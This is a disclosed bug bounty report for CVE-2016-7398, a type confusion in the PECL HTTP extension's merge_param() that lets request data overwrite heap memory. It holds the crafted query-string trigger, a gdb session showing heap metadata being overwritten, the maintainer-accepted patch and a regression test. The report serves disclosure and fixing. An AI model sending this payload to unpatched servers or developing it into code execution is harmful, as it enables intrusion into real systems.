@@ -1,0 +1,241 @@
+ReportLink:https://hackerone.com/reports/172411
+WeaknessName:Memory Corruption - Generic
+Reporter:https://hackerone.com/rc0r
+ReportedTo:PHP (IBB)(ibb-php)
+BountyAmount:500.0
+Severity:low
+State:Closed
+DateOfDisclosure:30.05.2017 15:13:53
+
+Summary:
+
+Since the original report is still marked as private in the PHP bug tracker please find the copy & pasted bug report below (edited for readability and to include correct bug tracker id). See the references section for a link to the issue in the PHP bug tracker!
+
+The maintainer already fixed the issue in the public git repo using the proposed patch included in the original report.
+
+Mitre assigned **CVE-2016-7398** for this issue.
+
+# Description
+
+The url parsing functions of the PECL HTTP extension allow overflowing
+a heap-based buffer with data originating from an arbitrary HTTP request.
+Affected is the `merge_param()` function in `php_http_params.c` that is called
+from `php_http_querystring_parse()`:  
+
+Code fragment from `merge_param()` in `php_http_params.c:491`:
+
+```c
+static void merge_param(HashTable *params, zval *zdata, ...)
+{
+/*[...]*/
+    while (Z_TYPE_P(zdata_ptr) == IS_ARRAY && (test_ptr = zend_hash_get_current_data(Z_ARRVAL_P(zdata_ptr)))) {
+        if (Z_TYPE_P(test_ptr) == IS_ARRAY) {
+            zval *tmp_ptr = ptr;
+    
+/*[...]*/           
+            } else {
+                if ((ptr = zend_hash_index_find(Z_ARRVAL_P(ptr), hkey.h))) {
+                    zdata_ptr = test_ptr;
+                } else if (hkey.h) {
+                    ptr = tmp_ptr;
+                    Z_TRY_ADDREF_P(test_ptr);
+/*[511]*/           ptr = zend_hash_index_update(Z_ARRVAL_P(ptr), hkey.h, test_ptr);
+/*[...]*/
+```
+
+In line 511 `zend_hash_index_update()` is called with ptr used as an array
+(`Z_ARRVAL_P(ptr)`) without actually checking its type. Thus it was possible
+to call `zend_hash_index_update()` on a `zend_string` instead which obviously
+leads to memory corruption issues.
+
+The sample request provided in this report uses this type confusion
+vulnerability to trigger an arbitrary heap overwrite. The actual overwrite
+occurs in `_zend_hash_index_add_or_update_i()`: 
+
+```c
+static zend_always_inline zval *_zend_hash_index_add_or_update_i(HashTable *ht, zend_ulong h, zval *pData, uint32_t flag ZEND_FILE_LINE_DC)
+{
+/*[...]*/
+add_to_hash:
+/*[...]*/
+    p = ht->arData + idx;
+    p->h = h;						// <- heap overflow
+    p->key = NULL;					// <- heap overflow
+/*[...]*/
+```
+
+Because of the invalid pointer provided as HashTable `ht->arData` points
+to an unexpected memory location on the heap and not to the list of Buckets
+of an ordinary `HashTable`. So the two following assignments allow to write
+arbitrary values (`hkey.h` and `NULL`) on the heap.
+As it turned out `hkey.h` can be controlled with request data received from
+the network.  
+The attached proof of concept demonstrates that this flaw very likely allows
+for remote code execution.
+
+This vulnerability was found using `afl-fuzz`/`afl-utils`.
+
+# PoC
+
+See the attached patch for the sample request in `bug73055.bin`.
+
+```
+$ cat http_querystring.php
+/*
+ * http_querystring.php
+ */
+<?php
+    $qs = new http\QueryString(file_get_contents("bug73055.bin"));
+?>
+$ ./configure --enable-raphf --enable-propro --with-http && make
+$ gdb ./sapi/cli/php
+gdb> b php_http_params.c:511
+gdb> r http_querystring.php
+    Breakpoint 1, merge_param (zdata=0x7fffffff9cf0, current_args=0x7fffffff9dd8, current_param=0x7fffffff9de0,
+    params=<optimized out>) at php_http_params.c:511
+    511				ptr = zend_hash_index_update(Z_ARRVAL_P(ptr), hkey.h, test_ptr);
+gdb> p ptr.u1.type_info
+    $1 = 6                      // <-- IS_STRING, incorrect type!
+gdb> b zend_hash.c:811
+gdb> c
+    Breakpoint 2, _zend_hash_index_add_or_update_i (flag=1, pData=0x7ffff425c6a0, h=16706, ht=0xf53dc0) at
+    zend_hash.c:811
+    811		p->h = h;						// <- heap overflow
+gdb> p &p->h
+    $2 = (zend_ulong *) 0x1091f40
+gdb> x/8gx 0x1091f20                    // heap before overflow
+    0x1091f20:	0x000000006c72755c	0x0000000000000021
+    0x1091f30:	0x00007ffff5addb48	0x0000000001092960
+    0x1091f40:	0x0000000000000020	0x0000000000000031 <-- heap meta-data (prev-size, size)
+    0x1091f50:	0x0000070600000001	0x800000017c9c614a
+gdb> ni 2
+gdb> x/8gx 0x1091f20                    // heap after overflow
+    0x1091f20:	0x000000006c72755c	0x0000000000000021
+    0x1091f30:	0x00007ffff5addb48	0x0000000001092960
+    0x1091f40:	0x0000000000004142	0x0000000000000000 <-- heap meta-data overwritten*
+    0x1091f50:	0x0000070600000001	0x800000017c9c614a
+    /*
+     * (*) 0x4142 originates from bug73055.bin offset 0x59
+     * The numeric string '16706' is converted into the integer
+     * it is representing 0x4142 (see sanitize_dimension()).
+     */
+gdb> bt                                 // for the record
+    #0  _zend_hash_index_add_or_update_i (flag=1, pData=0x7ffff425c6a0, h=16706, ht=0xf53dc0) at zend_hash.c:815
+    #1  _zend_hash_index_update (ht=0xf53dc0, h=16706, pData=pData@entry=0x7ffff425c6a0) at zend_hash.c:838
+    #2  0x00000000006b032b in merge_param (zdata=0x7fffffff9cf0, current_args=0x7fffffff9dd8, current_param=0x7fffffff9de0, params=<optimized out>) at php_http_params.c:511
+    #3  push_param (params=<optimized out>, state=<optimized out>, opts=<optimized out>) at php_http_params.c:607
+    #4  0x00000000006b2475 in php_http_params_parse (params=params@entry=0x7ffff42023f0, opts=opts@entry=0x7fffffff9e80) at php_http_params.c:755
+    #5  0x00000000006b5479 in php_http_querystring_parse (ht=0x7ffff42023f0, str=str@entry=0x7ffff4282018 '[' <repeats 27 times>, "]]]]", '[' <repeats 38 times>, "&%C0[]E[=&2[&%C0[]E[16706[*[", len=<optimized out>) at php_http_querystring.c:224
+    #6  0x00000000006b552c in php_http_querystring_update (qarray=qarray@entry=0x7fffffff9f80, params=params@entry=0x7ffff4213130, outstring=outstring@entry=0x0) at php_http_querystring.c:268
+    #7  0x00000000006b6029 in php_http_querystring_set (flags=0, params=0x7ffff4213130, instance=0x7ffff4213100) at php_http_querystring.c:49
+    #8  zim_HttpQueryString___construct (execute_data=<optimized out>, return_value=<optimized out>) at php_http_querystring.c:365
+    #9  0x00000000007b0a93 in ZEND_DO_FCALL_SPEC_RETVAL_UNUSED_HANDLER () at zend_vm_execute.h:970
+    [...]
+gdb> dis 1 2
+gdb> c
+    Fatal error: Uncaught http\Exception\BadQueryStringException: http\QueryString::__construct(): Max input nesting level of 64 exceeded in http_querystr.php:5
+    Stack trace:
+    #0 http_querystr.php(5): http\QueryString->__construct('[[[[[[[[[[[[[[[...')
+    #1 {main}
+    
+    Next 
+      thrown in http_querystr.php on line 5
+    *** Error in `sapi/cli/php': free(): invalid pointer: 0x0000000001091f50 ***
+    Program received signal SIGABRT, Aborted.
+    0x00007ffff577804f in raise () from /usr/lib/libc.so.6
+```
+
+# Patch
+
+After careful review by the project maintainers the following patch may be used
+to fix the reported issue. 
+
+    From 34ae784c44be4a60157947f8ccc8c918e9b6ba40 Mon Sep 17 00:00:00 2001
+    From: rc0r <hlt99@blinkenshell.org>
+    Date: Fri, 9 Sep 2016 11:31:57 +0200
+    Subject: [PATCH] Type confusion vulnerability in merge_param() (#73055) fixed
+    
+    ---
+     src/php_http_params.c   |  2 +-
+     tests/bug73055.phpt     | 25 +++++++++++++++++++++++++
+     tests/data/bug73055.bin |  1 +
+     3 files changed, 27 insertions(+), 1 deletion(-)
+     create mode 100644 tests/bug73055.phpt
+     create mode 100644 tests/data/bug73055.bin
+    
+    diff --git a/src/php_http_params.c b/src/php_http_params.c
+    index 8988f43..0846f47 100644
+    --- a/src/php_http_params.c
+    +++ b/src/php_http_params.c
+    @@ -489,7 +489,7 @@ static void merge_param(HashTable *params, zval *zdata, zval **current_param, zv
+                zval *test_ptr;
+     
+                while (Z_TYPE_P(zdata_ptr) == IS_ARRAY && (test_ptr = zend_hash_get_current_data(Z_ARRVAL_P(zdata_ptr)))) {
+    -				if (Z_TYPE_P(test_ptr) == IS_ARRAY) {
+    +				if ((Z_TYPE_P(test_ptr) == IS_ARRAY) && (Z_TYPE_P(ptr) == IS_ARRAY)) {
+                        zval *tmp_ptr = ptr;
+     
+                        /* now find key in ptr */
+    diff --git a/tests/bug73055.phpt b/tests/bug73055.phpt
+    new file mode 100644
+    index 0000000..260e823
+    --- /dev/null
+    +++ b/tests/bug73055.phpt
+    @@ -0,0 +1,25 @@
+    +--TEST--
+    +Type confusion vulnerability in merge_param()
+    +--SKIPIF--
+    +<?php
+    +include "skipif.inc";
+    +?>
+    +--FILE--
+    +<?php
+    +
+    +echo "Test\n";
+    +try {
+    +	echo new http\QueryString(file_get_contents(__DIR__."/data/bug73055.bin")); // <- put provided sample into correct location
+    +} catch (Exception $e) {
+    +	echo $e;
+    +}
+    +?>
+    +
+    +===DONE===
+    +--EXPECTF--
+    +Test
+    +%r(exception ')?%rhttp\Exception\BadQueryStringException%r(' with message '|: )%rhttp\QueryString::__construct(): Max input nesting level of 64 exceeded in %sbug73055.php:5
+    +Stack trace:
+    +#0 %sbug73055.php(5): http\QueryString->__construct('[[[[[[[[[[[[[[[...')
+    +#1 {main}
+    +===DONE===
+    \ No newline at end of file
+    diff --git a/tests/data/bug73055.bin b/tests/data/bug73055.bin
+    new file mode 100644
+    index 0000000..ad2dd9f
+    --- /dev/null
+    +++ b/tests/data/bug73055.bin
+    @@ -0,0 +1 @@
+    +[[[[[[[[[[[[[[[[[[[[[[[[[[[]]]][[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[&%C0[]E[=&2[&%C0[]E[16706[*[
+    \ No newline at end of file
+    -- 
+    2.9.3
+
+# Versions known to be affected
+
+pecl-http extension versions up to and including:
+
+* 3.1.0beta2 (PHP 7)
+* 2.6.0beta2 (PHP 5)
+
+
+# Timeline
+
+2016-09-09  Initial report to PHP bug tracker (#73055)
+2016-09-12  Issue fixed in git repository, CVE requested
+2016-09-13  Mitre assigned CVE-2016-7398
+
+
+# References
+
+https://bugs.php.net/bug.php?id=73055
+https://github.com/m6w6/ext-http/commit/17137d4ab1ce81a2cee0fae842340a344ef3da83
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7398
